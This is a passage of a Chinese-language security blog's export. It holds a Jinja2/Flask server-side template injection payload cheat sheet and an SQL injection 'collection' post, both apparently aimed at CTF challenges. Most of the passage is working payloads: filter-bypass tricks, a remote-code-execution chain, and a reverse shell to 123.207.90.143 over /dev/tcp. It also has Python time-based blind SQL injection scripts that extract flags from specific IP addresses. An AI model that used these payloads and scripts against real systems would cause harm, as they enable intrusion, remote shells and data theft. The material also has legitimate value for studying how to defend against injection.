class=\"line\">&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&amp;class=class&amp;usc=_</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;request|attr([&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2]|join)&#125;&#125;</span><br><span class=\"line\">&#123;&#123;request|attr([&quot;__&quot;,&quot;class&quot;,&quot;__&quot;]|join)&#125;&#125;</span><br><span class=\"line\">&#123;&#123;request|attr(&quot;__class__&quot;)&#125;&#125;</span><br><span class=\"line\">&#123;&#123;request.__class__&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"bypass-“-“-和-“-”\"><a href=\"#bypass-“-“-和-“-”\" class=\"headerlink\" title=\"bypass “[“ 和 “]”\"></a>bypass “[“ 和 “]”</h4><ol>\n<li>利用 attr</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class=class&amp;usc=_</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>进阶版 利用.getlist</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;request|attr(request.args.getlist(request.args.l)|join)&#125;&#125;&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_</span><br></pre></td></tr></table></figure>\n<h4 id=\"bypassing-“-join”\"><a href=\"#bypassing-“-join”\" class=\"headerlink\" title=\"bypassing “|join”\"></a>bypassing “|join”</h4><ol>\n<li>利用format</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f=%s%sclass%s%s&amp;a=_</span><br></pre></td></tr></table></figure>\n<h4 id=\"FinalRce\"><a href=\"#FinalRce\" class=\"headerlink\" title=\"FinalRce:\"></a>FinalRce:</h4><p>第一步:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:5000/?exploit=&#123;%set a,b,c,d,e,f,g,h,i = request.__class__.__mro__%&#125;&#123;&#123;i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337</span><br></pre></td></tr></table></figure>\n<p>第二步:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:5000/?exploit=&#123;%set a,b,c,d,e,f,g,h,i = request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%&#125;&#123;&#123;(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;class=class&amp;mro=mro&amp;subc=subclasses&amp;usc=_&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337</span><br></pre></td></tr></table></figure>\n<h4 id=\"Accessing-parameters\"><a href=\"#Accessing-parameters\" class=\"headerlink\" title=\"Accessing parameters\"></a>Accessing parameters</h4><p>In most examples we used request.args to access GET parameters, but there are other dictionaries that can be populated with custom values:</p>\n<ul>\n<li>GET: request.args</li>\n<li>Cookies: request.cookies</li>\n<li>Headers: request.headers</li>\n<li>Environment: request.environ</li>\n<li>Values: request.values</li>\n</ul>\n<p>The following notations can be used to access attributes of an object:</p>\n<ul>\n<li>request.<strong>class</strong></li>\n<li>request[“<strong>class</strong>“]</li>\n<li>request|attr(“<strong>class</strong>“)</li>\n</ul>\n<p>Elements of arrays can be accessed with:</p>\n<ul>\n<li>array[0]</li>\n<li>array.pop(0)</li>\n</ul>\n<h4 id=\"import\"><a href=\"#import\" class=\"headerlink\" title=\"import\"></a>import</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% <span class=\"keyword\">import</span> module %&#125; – Allows you to <span class=\"keyword\">import</span> python modules.</span><br><span class=\"line\"></span><br><span class=\"line\">Example: &#123;% <span class=\"keyword\">import</span> subprocess %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">That’s all we need to craft an exploit code.</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% <span class=\"keyword\">import</span> os %&#125;&#123;&#123; os.popen(<span class=\"string\">\"whoami\"</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"payload大全\"><a href=\"#payload大全\" class=\"headerlink\" title=\"payload大全\"></a>payload大全</h2><h4 id=\"bypass-各种字符串\"><a href=\"#bypass-各种字符串\" class=\"headerlink\" title=\"bypass 各种字符串\"></a>bypass 各种字符串</h4><ol>\n<li>利用request.args</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&apos;&apos;[request.args.a][request.args.b][2][request.args.c]()[40](&apos;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&apos;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>利用字符串拼接</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;request[<span class=\"string\">'__cla'</span>+<span class=\"string\">'ss__'</span>][<span class=\"string\">'__m'</span>+<span class=\"string\">'ro__'</span>][<span class=\"number\">9</span>][<span class=\"string\">'__subcla'</span>+<span class=\"string\">'sses__'</span>]()[<span class=\"number\">230</span>](<span class=\"string\">'''/bin/sh -c </span></span><br><span class=\"line\"><span class=\"string\">'l'''</span>+<span class=\"string\">'''s '''</span>+chr(<span class=\"number\">62</span>)+<span class=\"string\">'''&amp; /dev/tcp/123.207.90.143/2333 0'''</span>+chr(<span class=\"number\">62</span>)+<span class=\"string\">'''&amp;1 '''</span>,shell=<span class=\"keyword\">True</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li><p>利用各种编码</p>\n<blockquote>\n<p>“MTIzCg==”.decode(“base64”)</p>\n</blockquote>\n</li>\n<li><p>利用attr</p>\n</li>\n</ol>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&amp;class=class&amp;usc=_</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;request|attr([&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2]|join)&#125;&#125;</span><br><span class=\"line\">&#123;&#123;request|attr([&quot;__&quot;,&quot;class&quot;,&quot;__&quot;]|join)&#125;&#125;</span><br><span class=\"line\">&#123;&#123;request|attr(&quot;__class__&quot;)&#125;&#125;</span><br><span class=\"line\">&#123;&#123;request.__class__&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"bypass-“-“-和-“-”\"><a href=\"#bypass-“-“-和-“-”\" class=\"headerlink\" title=\"bypass “[“ 和 “]”\"></a>bypass “[“ 和 “]”</h4><ol>\n<li>利用 attr</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class=class&amp;usc=_</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>进阶版 利用.getlist</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;request|attr(request.args.getlist(request.args.l)|join)&#125;&#125;&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_</span><br></pre></td></tr></table></figure>\n<h4 id=\"bypassing-“-join”\"><a href=\"#bypassing-“-join”\" class=\"headerlink\" title=\"bypassing “|join”\"></a>bypassing “|join”</h4><ol>\n<li>利用format</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f=%s%sclass%s%s&amp;a=_</span><br></pre></td></tr></table></figure>\n<h4 id=\"FinalRce\"><a href=\"#FinalRce\" class=\"headerlink\" title=\"FinalRce:\"></a>FinalRce:</h4><p>第一步:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:5000/?exploit=&#123;%set a,b,c,d,e,f,g,h,i = request.__class__.__mro__%&#125;&#123;&#123;i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337</span><br></pre></td></tr></table></figure>\n<p>第二步:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:5000/?exploit=&#123;%set a,b,c,d,e,f,g,h,i = request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%&#125;&#123;&#123;(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;class=class&amp;mro=mro&amp;subc=subclasses&amp;usc=_&amp;file=/tmp/foo.py&amp;write=w&amp;payload=print+1337</span><br></pre></td></tr></table></figure>\n<h4 id=\"Accessing-parameters\"><a href=\"#Accessing-parameters\" class=\"headerlink\" title=\"Accessing parameters\"></a>Accessing parameters</h4><p>In most examples we used request.args to access GET parameters, but there are other dictionaries that can be populated with custom values:</p>\n<ul>\n<li>GET: request.args</li>\n<li>Cookies: request.cookies</li>\n<li>Headers: request.headers</li>\n<li>Environment: request.environ</li>\n<li>Values: request.values</li>\n</ul>\n<p>The following notations can be used to access attributes of an object:</p>\n<ul>\n<li>request.<strong>class</strong></li>\n<li>request[“<strong>class</strong>“]</li>\n<li>request|attr(“<strong>class</strong>“)</li>\n</ul>\n<p>Elements of arrays can be accessed with:</p>\n<ul>\n<li>array[0]</li>\n<li>array.pop(0)</li>\n</ul>\n<h4 id=\"import\"><a href=\"#import\" class=\"headerlink\" title=\"import\"></a>import</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% <span class=\"keyword\">import</span> module %&#125; – Allows you to <span class=\"keyword\">import</span> python modules.</span><br><span class=\"line\"></span><br><span class=\"line\">Example: &#123;% <span class=\"keyword\">import</span> subprocess %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">That’s all we need to craft an exploit code.</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% <span class=\"keyword\">import</span> os %&#125;&#123;&#123; os.popen(<span class=\"string\">\"whoami\"</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"sql注入大全","date":"2018-03-21T01:26:16.000Z","_content":"- 表名\n\n  ```mysql\n  select group_concat(distinct table_name) from information_schema.tables where table_schema=database()\n  ```\n\n\n- 列名\n\n  ```mysql\n  select group_concat(distinct column_name) from information_schema.columns where table_name=[16进制|`table_name`]\n  ```\n\n\n- 数据库\n\n  ```mysql\n  select group_concat(schema_name) from information_schema.schemata\n  ```\n\n- 表内容\n\n  ```mysql\n  select 1,concat(user, 0x2c, password) from [table_name]\n  ```\n\n  ​\n```\n优先级 运算符\n(最高)  !\n    -（负号）,~（按位取反）\n    ^（按位异或）\n    *,/(DIV),%(MOD)\n    +,-\n    >>,<<\n    &\n    |\n    =(比较运算),<=>,<,<=,>,>=,!=,<>,IN,IS NULL,LIKE,REGEXP\n   BETWEEN AND,CASE,WHEN,THEN,ELSE\n   NOT\n   &&,AND\n   XOR\n   ||,OR\n(最低)    =(赋值运算),:=\n```\n\n# union select 不允许同时出现\n过滤正则表达式如下:\n<code>\t\nunion[\\s\\xA0]+select\n</code><br/>\n可以使用union all select绕过\n\n# select过滤\nse%00lect绕过\n\n# -- 注释\n--后边不允许添加任何空白字符\n过滤正则表达式如下:\n--[\\s\\xA0]\n还可以使用%1a\n--%1a绕过\n\n# where后边跟着sleep函数\n`\nselect * from table_name where sleep(2) or 1 = 2;\n`\n\n如果1=2，则会等待（2*该表中的记录数）秒，没有数据返回\n如果1=1，则会立即返回所有数据\n\n@`'` 相当于 NULL\n\nselect group_concat(ip)'' from client_ip;\n\n# DNSlog盲注\nDNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like '%secure%';查看load_file()可以读取的磁盘。\n\n1、当secure_file_priv为空，就可以读取磁盘的目录。\n\n2、当secure_file_priv为G:\\，就可以读取G盘的文件。\n\n3、当secure_file_priv为null，load_file就不能加载文件。\n\n\nsleep 不能填数字，可以使用pi()替代\n\n各种payload:\n```\nselect * from antisqli where `id`='\\' and `pw`=md5(' union select 1,2,3--')\n```\n\n```\n644400 union select 'z1',flag,'z3','z4' from flag order by password desc#\n```\n\n关键词union,select,from被过滤，可以考虑%00绕过\n\n```\n//过滤sql\n$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');\nforeach ($array as $value)\n{\n\tif (substr_count($id, $value) > 0)\n\t{\n\t\texit('包含敏感关键字！'.$value);\n\t}\n}\n\n//xss过滤\n$id = strip_tags($id);\n\n$query = \"SELECT * FROM temp WHERE id={$id} LIMIT 1\";\npayload:\nhttp://103.238.227.13:10087/?id=2 unio%00n se%00lect hash,2 fro%00m sql3.key#\n由于strip_tags 将<>替换为空，所以可以使用<>绕过：\nhttp://103.238.227.13:10087/?id=2 unio<>n se<>lect hash,2 fro%00m sql3.key#\n```\n\n某些情况下SQL关键词被过滤掉并且被替换成空格。因此我们用“%0b”来绕过。\nid=1+uni%0bon+se%0blect+1,2,3--\n\n# Mysql大小写不敏感，绕过检测\n\n# heavy query       \n\n[链接](http://www.360zhijia.com/anquan/369098.html)\n\n## 笛卡尔积运算\n\n> select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C);\n\n```python\nimport requests\n\nurl = \"http://52.80.179.198:8080/article.php?id=1' and %s and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)%%23\"\ndata = \"\"\nfor i in range(1,1000):\n    for j in range(33,127):\n        #payload = \"(ascii(substr((database()),%s,1))=%s)\"%(i,j) #post\n        #payload = \"(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)\" % (i, j) #article,flags\n        #payload = \"(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)\" % (i, j) #flag\n        payload = \"(ascii(substr((select flag from flags limit 1),%s,1))=%s)\" % (i, j)\n        payload_url = url%(payload)\n        try:\n            r = requests.get(url=payload_url,timeout=8)\n        except:\n            data +=chr(j)\n            print data\n            break\n```\n\n\n\n##  Get_lock\n\nget_lock是mysql的锁机制\n\n* get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。\n* 当调用release_lock来释放上面的锁或者客户端断线，上面的锁才释放，其他的客户端才能进来\n\n打开两个cmd\n\ncmd1:\n\n```\nmysql> select get_lock('skysec.top',1);\n+--------------------------+\n| get_lock('skysec.top',1) |\n+--------------------------+\n|                        1 |\n+--------------------------+\n1 row in set (0.00 sec)\n```\n\ncmd2:\n\n```\nmysql> select get_lock('skysec.top',5);\n+--------------------------+\n| get_lock('skysec.top',5) |\n+--------------------------+\n|                        0 |\n+--------------------------+\n1 row in set (5.00 sec)\n```\n\ncmd1:\n\n```\nmysql> select get_lock('skysec.top',2);\n+--------------------------+\n| get_lock('skysec.top',2) |\n+--------------------------+\n|                        0 |\n+--------------------------+\n1 row in set (2.00 sec)\n```\n\n关闭cmd1,cmd2执行：\n\n```\nmysql> select get_lock('skysec.top',5);\n+--------------------------+\n| get_lock('skysec.top',5) |\n+--------------------------+\n|                        1 |\n+--------------------------+\n1 row in set (0.00 sec)\n```\n\ncmd1关闭之后，锁自动释放，方案不是最佳，原因，该方法需要前提，长连接一般在php版本系列中，我们建立与Mysql的连接使用的是`mysql_connect`。\n\n```\nmysql_connect() 脚本一结束，到服务器的连接就被关闭\nmysql_pconnect() 打开一个到 MySQL 服务器的持久连接\n```\n\n官方描述：\n\n```\nmysql_pconnect() 和 mysql_connect() 非常相似，但有两个主要区别。\n首先，当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的（持久）连接，如果找到，则返回此连接标识而不打开新连接。\n其次，当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用（mysql_close() 不会关闭由 mysql_pconnect() 建立的连接）。\n简单来说，即\nmysql_connect()使用后立刻就会断开\n而\nmysql_pconnect()会保持连接，并不会立刻断开\n```\n\n所以:\n\n我们的时间盲注必须基于我们请求加锁的资源已经被其他客户端加锁过了 而mysql_connect()一结束，就会立刻关闭连接 这就意味着，我们刚刚对资源`skysec.top`加完锁就立刻断开了 而get_lock一旦断开连接，就会立刻释放资源 那么也就破坏了我们的前提：我们请求加锁的key已经被其他客户端加锁过了 所以如果使用了`mysql_connect()`，那么get_lock的方法将不适用 而`mysql_pconnect()`建立的却是长连接，我们的锁可以在一段有效的时间中一直加持在特定资源上 从而使我们可以满足大前提，而导致新的time injection手法 当然这里还有一个注意点 即第一次加锁后，需要等待1~2分钟，再访问的时候服务器就会判断你为客户B，而非之前加锁的客户A 此时即可触发get_lock 同样我们也本地测试一下，还是之前的cmd1和cmd2\n\n cmd1:\n\n```\nmysql> select * from content where id = 1 and get_lock('skysec.top',1);\n+----+-------------------------------------+\n| id | content                             |\n+----+-------------------------------------+\n|  1 | I think you may need sql injection! |\n+----+-------------------------------------+\n1 row in set (0.00 sec)\n```\n\ncmd2:\n\n```\nmysql> select * from content where id =1 and 1 and get_lock('skysec.top',5);\nEmpty set (5.00 sec)\n\nmysql> select * from content where id =1 and 0 and get_lock('skysec.top',5);\nEmpty set (0.00 sec)\n```\n\n脚本如下:\n\n```python\n# -*- coding: utf-8 -*-\nimport requests\nimport time\nurl1 = \"http://52.80.179.198:8080/article.php?id=1' and get_lock('skysec.top',1)%23\"\nr = requests.get(url=url1)\ntime.sleep(90)\n# 加锁后变换身份\nurl2 = \"http://52.80.179.198:8080/article.php?id=1' and %s and get_lock('skysec.top',5)%%23\"\ndata = \"\"\nfor i in range(1,1000):\n    print i\n    for j in range(33,127):\n        #payload = \"(ascii(substr((database()),%s,1))=%s)\"%(i,j) #post\n        payload = \"(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)\" % (i, j) #article,flags\n        #payload = \"(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)\" % (i, j) #flag\n        #payload = \"(ascii(substr((select flag from flags limit 1),%s,1))=%s)\" % (i, j)\n        payload_url = url2%(payload)\n        try:\n            s = requests.get(url=payload_url,timeout=4.5)\n        except:\n            data +=chr(j)\n            print data\n            break\n```\n\n总结:\n\n必须使用长连接，即使用mysql_pconnect()\n\n构造被加锁的数据\n\n1.以客户A的身份,对资源skysec.top进行加锁 \n\n2.等待90s，让服务器将我们下一次的查询当做客户B \n\n3.利用客户B去尝试对资源skysec.top进行加锁，由于资源已被加锁，导致延时 \n\n## Rlike\n\n正则表达式\n\n```\nconcat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'\n```\n\n以上代码等同于sleep(5)\n\n ```\nmysql> select * from content where id =1 and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';\nEmpty set (4.24 sec)\n\nmysql> select * from content where id =1 and IF(0,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';\nEmpty set (0.00 sec)\n ```\n\n## sleep\n\n```\nmysql> select sleep(5);\n+----------+\n| sleep(5) |\n+----------+\n|        0 |\n+----------+\n1 row in set (5.00 sec)\n```\n\nBENCHMARK\n\n```\nmysql> select benchmark(10000000,sha(1));\n+----------------------------+\n| benchmark(10000000,sha(1)) |\n+----------------------------+\n|                          0 |\n+----------------------------+\n1 row in set (2.79 sec)\n```\n\n\n\n\n\n\n\n","source":"_posts/sql注入大全.md","raw":"---\ntitle: sql注入大全\ndate: 2018-03-21 09:26:16\ntags: \n- 安全\n- sql注入\ncategories: \n- 安全\n- sql注入\n---\n- 表名\n\n  ```mysql\n  select group_concat(distinct table_name) from information_schema.tables where table_schema=database()\n  ```\n\n\n- 列名\n\n  ```mysql\n  select group_concat(distinct column_name) from information_schema.columns where table_name=[16进制|`table_name`]\n  ```\n\n\n- 数据库\n\n  ```mysql\n  select group_concat(schema_name) from information_schema.schemata\n  ```\n\n- 表内容\n\n  ```mysql\n  select 1,concat(user, 0x2c, password) from [table_name]\n  ```\n\n  ​\n```\n优先级 运算符\n(最高)  !\n    -（负号）,~（按位取反）\n    ^（按位异或）\n    *,/(DIV),%(MOD)\n    +,-\n    >>,<<\n    &\n    |\n    =(比较运算),<=>,<,<=,>,>=,!=,<>,IN,IS NULL,LIKE,REGEXP\n   BETWEEN AND,CASE,WHEN,THEN,ELSE\n   NOT\n   &&,AND\n   XOR\n   ||,OR\n(最低)    =(赋值运算),:=\n```\n\n# union select 不允许同时出现\n过滤正则表达式如下:\n<code>\t\nunion[\\s\\xA0]+select\n</code><br/>\n可以使用union all select绕过\n\n# select过滤\nse%00lect绕过\n\n# -- 注释\n--后边不允许添加任何空白字符\n过滤正则表达式如下:\n--[\\s\\xA0]\n还可以使用%1a\n--%1a绕过\n\n# where后边跟着sleep函数\n`\nselect * from table_name where sleep(2) or 1 = 2;\n`\n\n如果1=2，则会等待（2*该表中的记录数）秒，没有数据返回\n如果1=1，则会立即返回所有数据\n\n@`'` 相当于 NULL\n\nselect group_concat(ip)'' from client_ip;\n\n# DNSlog盲注\nDNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like '%secure%';查看load_file()可以读取的磁盘。\n\n1、当secure_file_priv为空，就可以读取磁盘的目录。\n\n2、当secure_file_priv为G:\\，就可以读取G盘的文件。\n\n3、当secure_file_priv为null，load_file就不能加载文件。\n\n\nsleep 不能填数字，可以使用pi()替代\n\n各种payload:\n```\nselect * from antisqli where `id`='\\' and `pw`=md5(' union select 1,2,3--')\n```\n\n```\n644400 union select 'z1',flag,'z3','z4' from flag order by password desc#\n```\n\n关键词union,select,from被过滤，可以考虑%00绕过\n\n```\n//过滤sql\n$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');\nforeach ($array as $value)\n{\n\tif (substr_count($id, $value) > 0)\n\t{\n\t\texit('包含敏感关键字！'.$value);\n\t}\n}\n\n//xss过滤\n$id = strip_tags($id);\n\n$query = \"SELECT * FROM temp WHERE id={$id} LIMIT 1\";\npayload:\nhttp://103.238.227.13:10087/?id=2 unio%00n se%00lect hash,2 fro%00m sql3.key#\n由于strip_tags 将<>替换为空，所以可以使用<>绕过：\nhttp://103.238.227.13:10087/?id=2 unio<>n se<>lect hash,2 fro%00m sql3.key#\n```\n\n某些情况下SQL关键词被过滤掉并且被替换成空格。因此我们用“%0b”来绕过。\nid=1+uni%0bon+se%0blect+1,2,3--\n\n# Mysql大小写不敏感，绕过检测\n\n# heavy query       \n\n[链接](http://www.360zhijia.com/anquan/369098.html)\n\n## 笛卡尔积运算\n\n> select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C);\n\n```python\nimport requests\n\nurl = \"http://52.80.179.198:8080/article.php?id=1' and %s and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)%%23\"\ndata = \"\"\nfor i in range(1,1000):\n    for j in range(33,127):\n        #payload = \"(ascii(substr((database()),%s,1))=%s)\"%(i,j) #post\n        #payload = \"(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)\" % (i, j) #article,flags\n        #payload = \"(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)\" % (i, j) #flag\n        payload = \"(ascii(substr((select flag from flags limit 1),%s,1))=%s)\" % (i, j)\n        payload_url = url%(payload)\n        try:\n            r = requests.get(url=payload_url,timeout=8)\n        except:\n            data +=chr(j)\n            print data\n            break\n```\n\n\n\n##  Get_lock\n\nget_lock是mysql的锁机制\n\n* get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。\n* 当调用release_lock来释放上面的锁或者客户端断线，上面的锁才释放，其他的客户端才能进来\n\n打开两个cmd\n\ncmd1:\n\n```\nmysql> select get_lock('skysec.top',1);\n+--------------------------+\n| get_lock('skysec.top',1) |\n+--------------------------+\n|                        1 |\n+--------------------------+\n1 row in set (0.00 sec)\n```\n\ncmd2:\n\n```\nmysql> select get_lock('skysec.top',5);\n+--------------------------+\n| get_lock('skysec.top',5) |\n+--------------------------+\n|                        0 |\n+--------------------------+\n1 row in set (5.00 sec)\n```\n\ncmd1:\n\n```\nmysql> select get_lock('skysec.top',2);\n+--------------------------+\n| get_lock('skysec.top',2) |\n+--------------------------+\n|                        0 |\n+--------------------------+\n1 row in set (2.00 sec)\n```\n\n关闭cmd1,cmd2执行：\n\n```\nmysql> select get_lock('skysec.top',5);\n+--------------------------+\n| get_lock('skysec.top',5) |\n+--------------------------+\n|                        1 |\n+--------------------------+\n1 row in set (0.00 sec)\n```\n\ncmd1关闭之后，锁自动释放，方案不是最佳，原因，该方法需要前提，长连接一般在php版本系列中，我们建立与Mysql的连接使用的是`mysql_connect`。\n\n```\nmysql_connect() 脚本一结束，到服务器的连接就被关闭\nmysql_pconnect() 打开一个到 MySQL 服务器的持久连接\n```\n\n官方描述：\n\n```\nmysql_pconnect() 和 mysql_connect() 非常相似，但有两个主要区别。\n首先，当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的（持久）连接，如果找到，则返回此连接标识而不打开新连接。\n其次，当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用（mysql_close() 不会关闭由 mysql_pconnect() 